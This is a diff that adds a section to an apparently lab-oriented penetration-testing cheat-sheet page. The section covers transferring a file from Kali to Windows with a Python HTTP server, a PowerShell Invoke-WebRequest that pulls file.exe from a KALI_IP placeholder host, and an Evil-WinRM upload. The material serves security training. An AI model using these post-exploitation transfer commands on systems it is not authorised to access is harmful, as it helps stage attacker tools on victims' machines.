@@ -9,6 +9,46 @@ hideFooterPagination: true
 
 {/* Generated from Commands/linux-to-windows.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Kali → Windows file transfer: choose the operation and read the result
+
+Serve a file from Kali and download it on Windows. Requires Windows → Kali TCP 8000.
+
+### What the result establishes
+
+Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
+
+### Prerequisites and common failures
+
+PowerShell and curl.exe are different clients; quoting, TLS trust, proxy configuration and the current working directory can change the result.
+
+### Example 1: 1. Kali — from the folder containing the file
+
+Run in: **Kali**. Keep the server running; serve only the intended transfer folder.
+
+```bash
+python3 -m http.server 8000
+```
+
+### Example 2: 2. Windows — save the file
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
+```
+
+### Example 3: Alternative — if already in Evil-WinRM
+
+Run in: **Evil-WinRM prompt**.
+
+```bash
+upload ./file.exe C:\Users\Public\file.exe
+```
+
+## Saved commands and notebook recipes
+
+Serve a file from Kali and download it on Windows. Requires Windows → Kali TCP 8000.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=linux-to-windows) · [All tools](/index)
@@ -40,3 +80,11 @@ upload ./file.exe C:\Users\Public\file.exe
 ```
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
